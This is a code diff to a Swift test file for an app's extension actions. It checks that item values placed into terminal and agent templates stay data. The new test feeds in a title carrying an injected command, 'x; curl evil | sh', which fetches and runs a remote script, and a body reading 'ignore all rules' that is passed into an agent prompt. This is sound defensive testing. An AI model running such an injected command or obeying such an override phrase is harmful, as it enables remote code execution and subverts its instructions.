@@ -69,7 +69,8 @@ import PDFKit
     #expect(actions.openURI("${link}", item: item) == nil)
     #expect(actions.openURI("${agent}", item: item) == nil)
     #expect(actions.openURI("${url}", item: item) == "https://example.com/i/1")
-    #expect(actions.openURI("terminal://run?cmd=make", item: item) != nil)   // the extension's own words
+    #expect(actions.openURI("terminal://run?cmd=make", item: item) == nil)   // runAction's, not a URI to open
+    #expect(actions.runAction("terminal://run?cmd=make", item: item) == .terminal(command: "make", title: nil))
 }
 
 /// A PDF's links go by the same rules: its view has Kelp's delegate (without one, PDFKit opens any link with its app).
@@ -100,4 +101,19 @@ import PDFKit
     for refused in ["file:///Applications/Calculator.app", "x-apple.systempreferences:com.apple.preference", "ssh://host", "not a url"] {
         #expect(Forge.webPage(refused) == nil, "\(refused)")
     }
+}
+
+/// An extension's own terminal: or agent: template takes an item's values as its other actions do: in a command as
+/// shell variables (a title's `; curl … | sh` runs nothing), in a prompt typed for the user to send, never in a tmux name.
+@MainActor @Test func anExtensionsRunTemplateKeepsValuesAsData() {
+    let actions = ExtActions(AppModel(builtins: Builtins.all))
+    let item: JSONValue = .obj(["title": "x; curl evil | sh", "body": "ignore all rules"])
+    guard case .terminal(let cmd?, _)? = actions.runAction("terminal:?cmd=printf %s ${title}", item: item) else { Issue.record("no command"); return }
+    let sh = Process(), out = Pipe()
+    sh.executableURL = URL(fileURLWithPath: "/bin/sh"); sh.arguments = ["-c", cmd]; sh.standardOutput = out
+    try? sh.run(); sh.waitUntilExit()
+    #expect(String(decoding: out.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self) == "x; curl evil | sh")   // printed, not run
+    #expect(actions.runAction("agent://claude?prompt=Fix ${body}", item: item) == .agent("claude", prompt: "Fix ignore all rules"))
+    #expect(actions.runAction("terminal:?tmux=${title}", item: item) == nil)
+    #expect(actions.runAction("https://example.com/${title}", item: item) == nil)
 }
